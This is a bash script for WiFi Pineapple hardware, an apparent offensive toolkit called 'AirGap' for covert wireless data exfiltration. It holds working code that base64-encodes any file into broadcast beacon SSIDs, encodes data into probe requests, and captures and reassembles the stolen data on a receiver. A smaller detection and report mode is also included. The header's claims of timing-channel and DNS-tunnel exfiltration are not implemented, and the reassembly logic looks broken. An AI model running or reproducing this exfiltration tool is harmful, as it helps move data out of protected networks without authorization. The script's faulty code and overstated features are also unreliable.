#!/bin/bash
###############################################################################
# AirGap — Wireless Air-Gap Exfiltration & Covert Channel Toolkit
# NullSec Suite | WiFi Pineapple Mark VII / Nano / Tetra
#
# Implements multiple covert wireless channels for data exfiltration:
# - SSID encoding (data in beacon SSID fields)
# - Timing-based channels (inter-frame timing modulation)
# - Probe request encoding (data in directed probes)
# - DNS tunneling over WiFi
# Also includes detection mode for finding these techniques in the wild.
#
# Author : bad-antics (NullSec)
# Version: 1.0.0
# License: MIT
###############################################################################

PAYLOAD_DIR="/root/payloads/AirGap"
LOOT_DIR="/mmc/nullsec/airgap"
LOG_FILE="$LOOT_DIR/airgap.log"
REPORT_FILE="$LOOT_DIR/airgap_report.html"
IFACE=""

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; MAG='\033[0;35m'; RST='\033[0m'

log()  { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
ok()   { log "${GRN}[✓]${RST} $*"; }
warn() { log "${YEL}[!]${RST} $*"; }
fail() { log "${RED}[✗]${RST} $*"; }
info() { log "${CYN}[i]${RST} $*"; }

banner() {
    echo -e "${MAG}"
    cat << 'EOF'
     _    _       ____
    / \  (_)_ __ / ___| __ _ _ __
   / _ \ | | '__| |  _ / _` | '_ \
  / ___ \| | |  | |_| | (_| | |_) |
 /_/   \_\_|_|   \____|\__,_| .__/
                             |_|
        NullSec Covert Channel Toolkit
EOF
    echo -e "${RST}"
}

# ── Pre-flight ─────────────────────────────────────────────────────────────
preflight() {
    mkdir -p "$LOOT_DIR"
    > "$LOG_FILE"

    IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    if [ -z "$IFACE" ]; then
        fail "No wireless interface found"
        exit 1
    fi
    ok "Interface: $IFACE"
}

# ── Encoding utilities ─────────────────────────────────────────────────────
# Base64 encode data for SSID embedding (max 32 chars per SSID)
encode_ssid_chunk() {
    echo -n "$1" | base64 | tr -d '\n'
}

decode_ssid_chunk() {
    echo -n "$1" | base64 -d 2>/dev/null
}

# Hex encoding for probe requests
hex_encode() {
    echo -n "$1" | xxd -p | tr -d '\n'
}

hex_decode() {
    echo -n "$1" | xxd -r -p
}

# ═════════════════════════════════════════════════════════════════════════
# EXFILTRATION MODES
# ═════════════════════════════════════════════════════════════════════════

# ── SSID Beacon Exfiltration ──────────────────────────────────────────────
# Encode data into beacon frame SSID fields. Each beacon carries up to
# 28 bytes of payload (prefix + sequence number use 4 bytes).
ssid_exfil() {
    local input_file="$1"
    if [ ! -f "$input_file" ]; then
        fail "File not found: $input_file"
        return 1
    fi

    local file_size
    file_size=$(wc -c < "$input_file")
    info "SSID Exfil: Encoding $file_size bytes from $(basename "$input_file")"

    # Base64 encode the file
    local encoded
    encoded=$(base64 "$input_file" | tr -d '\n')
    local total_len=${#encoded}

    # Split into 28-char chunks (SSID max 32 - 4 for header)
    local chunk_size=28
    local total_chunks=$(( (total_len + chunk_size - 1) / chunk_size ))
    local prefix="NS"  # NullSec prefix for receiver identification

    info "Transmitting $total_chunks beacon chunks..."

    # Create hostapd config for each chunk
    local seq=0
    while [ $seq -lt $total_chunks ]; do
        local offset=$((seq * chunk_size))
        local chunk="${encoded:$offset:$chunk_size}"
        local ssid_name
        ssid_name=$(printf "%s%02X%s" "$prefix" "$seq" "$chunk")

        # Create temporary AP with this SSID
        local tmp_conf
        tmp_conf=$(mktemp)
        cat > "$tmp_conf" << HEOF
interface=$IFACE
ssid=$ssid_name
channel=6
hw_mode=g
beacon_int=50
HEOF
        
        # Broadcast for 2 seconds (enough for receivers to capture)
        timeout 2 hostapd "$tmp_conf" &>/dev/null
        rm -f "$tmp_conf"

        printf "\r  Chunk %d/%d transmitted  " "$((seq+1))" "$total_chunks"
        ((seq++))
        sleep 0.5
    done

    # End-of-transmission marker
    local end_conf
    end_conf=$(mktemp)
    cat > "$end_conf" << HEOF
interface=$IFACE
ssid=${prefix}FF_END_${total_chunks}
channel=6
hw_mode=g
beacon_int=50
HEOF
    timeout 2 hostapd "$end_conf" &>/dev/null
    rm -f "$end_conf"

    echo ""
    ok "SSID exfiltration complete: $total_chunks chunks transmitted"
}

# ── SSID Beacon Receiver ─────────────────────────────────────────────────
ssid_receive() {
    local output_file="${1:-$LOOT_DIR/ssid_received.bin}"
    local duration="${2:-120}"
    info "SSID Receiver: Listening for $duration seconds..."

    # Enable monitor mode
    airmon-ng start "$IFACE" &>/dev/null
    local mon="${IFACE}mon"
    [ ! -d "/sys/class/net/$mon" ] && mon="$IFACE"

    local capture_file="$LOOT_DIR/ssid_capture.pcap"

    # Capture beacons
    timeout "$duration" tshark -i "$mon" -Y "wlan.fc.type_subtype == 0x08" \
        -T fields -e wlan.ssid -w "$capture_file" 2>/dev/null &
    local cap_pid=$!

    # Also extract SSIDs in real-time
    local ssid_list="$LOOT_DIR/ssid_raw.txt"
    > "$ssid_list"
    timeout "$duration" tshark -i "$mon" -Y "wlan.fc.type_subtype == 0x08" \
        -T fields -e wlan.ssid 2>/dev/null | while read -r ssid; do
        # Filter for NullSec encoded SSIDs
        if [[ "$ssid" == NS* ]]; then
            echo "$ssid" >> "$ssid_list"
        fi
    done &

    wait "$cap_pid" 2>/dev/null

    airmon-ng stop "$mon" &>/dev/null 2>&1

    # Reassemble
    if [ -s "$ssid_list" ]; then
        info "Reassembling captured data..."
        local reassembled=""
        sort -u "$ssid_list" | sort -t'S' -k2 | while read -r ssid; do
            # Skip end marker
            [[ "$ssid" == *"_END_"* ]] && continue
            # Extract payload (skip NS + 2-char hex sequence)
            local payload="${ssid:4}"
            reassembled+="$payload"
        done

        if [ -n "$reassembled" ]; then
            echo -n "$reassembled" | base64 -d > "$output_file" 2>/dev/null
            ok "Data reassembled: $output_file ($(wc -c < "$output_file") bytes)"
        fi
    else
        warn "No NullSec-encoded SSIDs captured"
    fi
}

# ── Probe Request Exfiltration ────────────────────────────────────────────
probe_exfil() {
    local data="$1"
    info "Probe exfil: Encoding '${data:0:40}...' into probe requests"

    local hex_data
    hex_data=$(hex_encode "$data")
    local chunk_size=24  # Max probe SSID useful payload
    local total=${#hex_data}
    local chunks=$(( (total + chunk_size - 1) / chunk_size ))

    for ((i=0; i<chunks; i++)); do
        local offset=$((i * chunk_size))
        local chunk="${hex_data:$offset:$chunk_size}"
        local probe_ssid
        probe_ssid=$(printf "PX%02X%s" "$i" "$chunk")

        # Send probe request
        iwconfig "$IFACE" essid "$probe_ssid" 2>/dev/null
        sleep 0.3
        printf "\r  Probe %d/%d sent  " "$((i+1))" "$chunks"
    done
    echo ""
    ok "Probe exfiltration complete"
}

# ═════════════════════════════════════════════════════════════════════════
# DETECTION MODE — Find covert channels in the wild
# ═════════════════════════════════════════════════════════════════════════

detect_covert_channels() {
    local duration="${1:-60}"
    info "Scanning for covert wireless channels ($duration seconds)..."

    airmon-ng start "$IFACE" &>/dev/null
    local mon="${IFACE}mon"
    [ ! -d "/sys/class/net/$mon" ] && mon="$IFACE"

    local findings_file="$LOOT_DIR/covert_findings.csv"
    echo "timestamp,type,evidence,detail,risk" > "$findings_file"
    local finding_count=0

    # Capture all traffic
    local pcap="$LOOT_DIR/covert_scan.pcap"
    timeout "$duration" tshark -i "$mon" -w "$pcap" 2>/dev/null &
    local cap_pid=$!
    sleep "$duration"
    wait "$cap_pid" 2>/dev/null

    if [ ! -f "$pcap" ]; then
        airmon-ng stop "$mon" &>/dev/null 2>&1
        fail "No capture data"
        return
    fi

    # 1. Check for encoded SSIDs (base64-like patterns)
    info "Checking for encoded SSIDs..."
    local ssids
    ssids=$(tshark -r "$pcap" -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid 2>/dev/null | sort -u)
    while IFS= read -r ssid; do
        [ -z "$ssid" ] && continue
        # Check for base64-encoded patterns
        if echo "$ssid" | grep -qP '^[A-Za-z0-9+/=]{20,}$'; then
            warn "Possible encoded SSID: $ssid"
            echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),SSID_ENCODING,$ssid,Base64-like SSID content,high" >> "$findings_file"
            ((finding_count++))
        fi
        # Check for hex-encoded patterns
        if echo "$ssid" | grep -qP '^[0-9a-fA-F]{16,}$'; then
            warn "Possible hex-encoded SSID: $ssid"
            echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),SSID_HEX_ENCODING,$ssid,Hex-encoded SSID,high" >> "$findings_file"
            ((finding_count++))
        fi
        # Sequential SSIDs (exfil chunks)
        if echo "$ssid" | grep -qP '^(NS|PX|EX)[0-9A-Fa-f]{2}'; then
            warn "Sequential exfil SSID pattern: $ssid"
            echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),SSID_EXFIL,$ssid,Sequential chunk pattern detected,critical" >> "$findings_file"
            ((finding_count++))
        fi
    done <<< "$ssids"

    # 2. Rapid SSID changes (beacon spam for data exfil)
    local unique_ssids total_beacons
    unique_ssids=$(echo "$ssids" | wc -l)
    total_beacons=$(tshark -r "$pcap" -Y "wlan.fc.type_subtype == 0x08" 2>/dev/null | wc -l)
    if [ "$unique_ssids" -gt 30 ] && [ "$total_beacons" -gt 100 ]; then
        warn "High SSID diversity: $unique_ssids unique SSIDs in $total_beacons beacons"
        echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),SSID_FLOOD,,${unique_ssids} unique SSIDs / ${total_beacons} beacons,high" >> "$findings_file"
        ((finding_count++))
    fi

    # 3. Suspicious probe request patterns
    local probes
    probes=$(tshark -r "$pcap" -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.ssid 2>/dev/null | sort -u)
    local probe_count
    probe_count=$(echo "$probes" | grep -c "." || true)
    if [ "$probe_count" -gt 20 ]; then
        warn "High probe diversity: $probe_count unique probe SSIDs"
        echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),PROBE_EXFIL,,${probe_count} unique probe SSIDs,medium" >> "$findings_file"
        ((finding_count++))
    fi

    # 4. Timing channel detection (regular inter-frame intervals)
    info "Analyzing frame timing patterns..."
    local timing_file="$LOOT_DIR/timing_analysis.txt"
    tshark -r "$pcap" -T fields -e frame.time_delta 2>/dev/null | head -1000 > "$timing_file"
    
    # Check for suspiciously regular timing
    if [ -f "$timing_file" ] && [ -s "$timing_file" ]; then
        local stddev
        stddev=$(awk '{sum+=$1; sumsq+=$1*$1; n++} END {if(n>0) printf "%.6f", sqrt(sumsq/n - (sum/n)^2)}' "$timing_file" 2>/dev/null)
        if [ -n "$stddev" ] && (( $(echo "$stddev < 0.001" | bc -l 2>/dev/null || echo 0) )); then
            warn "Suspiciously regular frame timing (σ=$stddev) — possible timing channel"
            echo "$(date -u '+%Y-%m-%dT%H:%M:%SZ'),TIMING_CHANNEL,,Standard deviation: $stddev,critical" >> "$findings_file"
            ((finding_count++))
        fi
    fi

    airmon-ng stop "$mon" &>/dev/null 2>&1

    if [ "$finding_count" -gt 0 ]; then
        warn "⚠ Found $finding_count covert channel indicators"
    else
        ok "No covert channel indicators detected"
    fi
}

# ── HTML Report ────────────────────────────────────────────────────────────
generate_report() {
    info "Generating AirGap analysis report..."

    local finding_count
    finding_count=$(tail -n +2 "$LOOT_DIR/covert_findings.csv" 2>/dev/null | wc -l || echo 0)

    cat > "$REPORT_FILE" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>AirGap Report — NullSec</title>
<style>
:root{--bg:#0a0e17;--card:#111827;--accent:#c084fc;--red:#f43f5e;--grn:#34d399;--txt:#e0e0e0}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:24px}
h1{color:var(--accent);font-size:28px;margin-bottom:24px}
h2{color:var(--accent);margin:24px 0 12px}
.stat{display:inline-block;background:var(--card);border-radius:12px;padding:20px 40px;text-align:center;border:1px solid #222;margin-right:16px}
.stat .n{font-size:36px;font-weight:700;color:var(--accent)}
.stat .l{font-size:13px;color:#888;margin-top:4px}
table{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;margin:16px 0}
th{background:#1a2332;color:var(--accent);padding:14px 16px;text-align:left;font-size:12px;text-transform:uppercase}
td{padding:10px 16px;border-bottom:1px solid #1a1a2e;font-size:13px}
.critical{color:var(--red);font-weight:bold}
.high{color:#f97316;font-weight:bold}
.medium{color:#eab308}
.footer{margin-top:32px;text-align:center;color:#555;font-size:12px}
</style></head><body>
<h1>🌊 AirGap Covert Channel Analysis</h1>
<div class="stat"><div class="n">$finding_count</div><div class="l">Indicators Found</div></div>

<h2>Findings</h2>
<table><thead><tr><th>Time</th><th>Type</th><th>Evidence</th><th>Detail</th><th>Risk</th></tr></thead><tbody>
HTMLEOF

    tail -n +2 "$LOOT_DIR/covert_findings.csv" 2>/dev/null | while IFS=',' read -r ts type ev detail risk; do
        echo "<tr><td>$ts</td><td>$type</td><td><code>$ev</code></td><td>$detail</td><td class=\"$risk\">$risk</td></tr>" >> "$REPORT_FILE"
    done

    cat >> "$REPORT_FILE" << 'HTMLEOF'
</tbody></table>
<h2>Channel Types Monitored</h2>
<table><thead><tr><th>Channel</th><th>Technique</th><th>Detection Method</th></tr></thead><tbody>
<tr><td>SSID Encoding</td><td>Data encoded in beacon SSID fields (base64/hex)</td><td>Pattern matching, entropy analysis</td></tr>
<tr><td>Probe Exfil</td><td>Data encoded in probe request SSIDs</td><td>Probe diversity analysis</td></tr>
<tr><td>Timing Channel</td><td>Data encoded in inter-frame timing intervals</td><td>Statistical variance analysis</td></tr>
<tr><td>Beacon Flood</td><td>Rapid SSID changes for bulk data transfer</td><td>SSID/beacon ratio analysis</td></tr>
</tbody></table>
<div class="footer">AirGap v1.0.0 — NullSec Suite — For authorized testing only</div>
</body></html>
HTMLEOF

    ok "Report: $REPORT_FILE"
}

LED() { command -v LED &>/dev/null && command LED "$@" 2>/dev/null; true; }

# ── Interactive menu ───────────────────────────────────────────────────────
show_menu() {
    while true; do
        echo ""
        echo -e "${MAG}╔═══════════════════════════════════════════╗${RST}"
        echo -e "${MAG}║       AirGap — Covert Channel Toolkit     ║${RST}"
        echo -e "${MAG}╠═══════════════════════════════════════════╣${RST}"
        echo -e "${MAG}║${RST} [1] SSID Beacon Exfiltration (send)        ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [2] SSID Beacon Receiver (listen)          ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [3] Probe Request Exfiltration             ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [4] Detect Covert Channels                 ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [5] Generate Report                        ${MAG}║${RST}"
        echo -e "${MAG}║${RST} [0] Exit                                   ${MAG}║${RST}"
        echo -e "${MAG}╚═══════════════════════════════════════════╝${RST}"
        echo ""
        read -rp "Select> " choice

        case "$choice" in
            1) read -rp "File to exfiltrate: " f; ssid_exfil "$f" ;;
            2) read -rp "Duration (s) [120]: " d; ssid_receive "$LOOT_DIR/received.bin" "${d:-120}" ;;
            3) read -rp "Data to send: " data; probe_exfil "$data" ;;
            4) read -rp "Scan duration (s) [60]: " d; detect_covert_channels "${d:-60}" ;;
            5) generate_report ;;
            0) ok "Exiting AirGap"; exit 0 ;;
            *) warn "Invalid" ;;
        esac
    done
}

main() {
    banner
    preflight
    case "$1" in
        --detect) detect_covert_channels "${2:-60}"; generate_report ;;
        --send)   ssid_exfil "$2" ;;
        --recv)   ssid_receive "$LOOT_DIR/received.bin" "${2:-120}" ;;
        *)        show_menu ;;
    esac
}

main "$@"
